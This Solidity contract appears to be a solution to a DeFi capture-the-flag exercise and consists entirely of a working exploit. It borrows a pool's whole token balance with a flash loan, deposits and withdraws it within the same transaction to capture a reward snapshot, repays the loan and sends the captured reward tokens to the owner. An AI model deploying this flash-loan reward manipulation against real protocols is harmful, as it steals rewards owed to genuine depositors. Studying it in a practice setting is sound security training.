// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract TheRewarderAttacker {
    address private immutable flashLoanerPool;
    address private immutable rewarderPool;
    address private immutable rewardToken;
    address private immutable liquidityToken;
    address private _owner;

    constructor(
        address flanloaner_pool,
        address rewarder_pool,
        address reward_token,
        address liquidity_token
    ) {
        flashLoanerPool = flanloaner_pool;
        rewarderPool = rewarder_pool;
        rewardToken = reward_token;
        liquidityToken = liquidity_token;
        _owner = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("receiveFlashLoan", amount);
        // 2. deposit into TheRewarderPool
        bool success;
        (success, ) = liquidityToken.call(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                rewarderPool,
                amount
            )
        );
        require(success, "approve failed");
        (success, ) = rewarderPool.call(
            abi.encodeWithSignature("deposit(uint256)", amount)
        );
        require(success, "deposit failed");
        // 3. withdraw from TheRewarderPool
        (success, ) = rewarderPool.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        require(success, "withdraw failed");
        // 4. repay flash loan
        (success, ) = liquidityToken.call(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                flashLoanerPool,
                amount
            )
        );
        require(success, "transfer failed");
    }

    function claimRewards() external {
        bool success;
        (success, ) = rewarderPool.call(
            abi.encodeWithSignature("distributeRewards()")
        );
        require(success, "distributeRewards failed");
    }

    function attack() external {
        require(msg.sender == _owner, "only owner can call");
        bool success;
        bytes memory balancebytes;
        // 1. flash loan from FlashLoanerPool
        (success, balancebytes) = liquidityToken.call(
            abi.encodeWithSignature(
                "balanceOf(address)",
                address(flashLoanerPool)
            )
        );
        // require(success, "balanceOf failed");
        console.log("attack", uint256(bytes32(balancebytes)));
        (success, ) = flashLoanerPool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256)",
                uint256(bytes32(balancebytes))
            )
        );
        require(success, "flashLoan failed");

        // 1. flash loan from FlashLoanerPool
        (success, balancebytes) = rewardToken.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );

        (success, ) = rewardToken.call(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                _owner,
                uint256(bytes32(balancebytes))
            )
        );
    }
}
